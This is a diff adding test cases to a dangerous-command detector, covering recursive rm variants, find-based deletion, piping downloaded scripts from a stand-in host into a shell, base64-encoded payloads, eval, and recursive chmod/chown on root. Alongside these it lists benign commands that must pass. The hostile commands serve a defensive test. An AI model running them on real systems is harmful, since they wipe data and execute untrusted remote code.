@@ -74,9 +74,70 @@ describe("isDangerousCommand", () => {
     }
   });
 
+  // Phase 20.1 — bypasses that previously slipped past the short-flag heuristic.
+  it("flags rm in long-form and split flag forms", () => {
+    for (const c of [
+      "rm --recursive --force /",
+      "rm --force --recursive /var",
+      "rm -r -f /home/user",
+      "rm -f -r ./build",
+      "rm -rf --no-preserve-root /",
+      "rm --no-preserve-root -rf /",
+    ]) {
+      expect(isDangerousCommand(c), c).toBe(true);
+    }
+  });
+
+  it("flags find-based mass deletion", () => {
+    for (const c of [
+      "find / -name '*.log' -delete",
+      "find . -type f -exec rm {} +",
+      "sudo find /var -mtime +30 -exec rm -f {} \\;",
+    ]) {
+      expect(isDangerousCommand(c), c).toBe(true);
+    }
+  });
+
+  it("flags piping opaque content into a shell", () => {
+    for (const c of [
+      "curl http://evil.example/x.sh | sh",
+      "wget -qO- http://x | sudo bash",
+      "echo cm0gLXJmIC8K | base64 -d | bash",
+    ]) {
+      expect(isDangerousCommand(c), c).toBe(true);
+    }
+  });
+
+  it("flags base64-decode and eval obfuscation", () => {
+    for (const c of [
+      "base64 -d payload.b64 > run && sh run",
+      "base64 --decode payload | sh",
+      'eval "$ENCODED_CMD"',
+    ]) {
+      expect(isDangerousCommand(c), c).toBe(true);
+    }
+  });
+
+  it("flags recursive chmod/chown on the filesystem root", () => {
+    for (const c of ["chmod -R 755 /", "chown -R root:root /", "sudo chmod -R 000 /"]) {
+      expect(isDangerousCommand(c), c).toBe(true);
+    }
+  });
+
   it("leaves ordinary commands alone", () => {
-    for (const c of ["ls -la", "apt install nginx", "systemctl status nginx", "cat /etc/hosts"]) {
-      expect(isDangerousCommand(c)).toBe(false);
+    for (const c of [
+      "ls -la",
+      "apt install nginx",
+      "systemctl status nginx",
+      "cat /etc/hosts",
+      "git log | less",
+      "cat access.log | grep 404",
+      "ls | wc -l",
+      "find . -name '*.tmp'",
+      "base64 secret.txt > secret.b64", // encoding, not decoding
+      "rm build/output.o", // non-recursive single file
+    ]) {
+      expect(isDangerousCommand(c), c).toBe(false);
     }
   });
 });
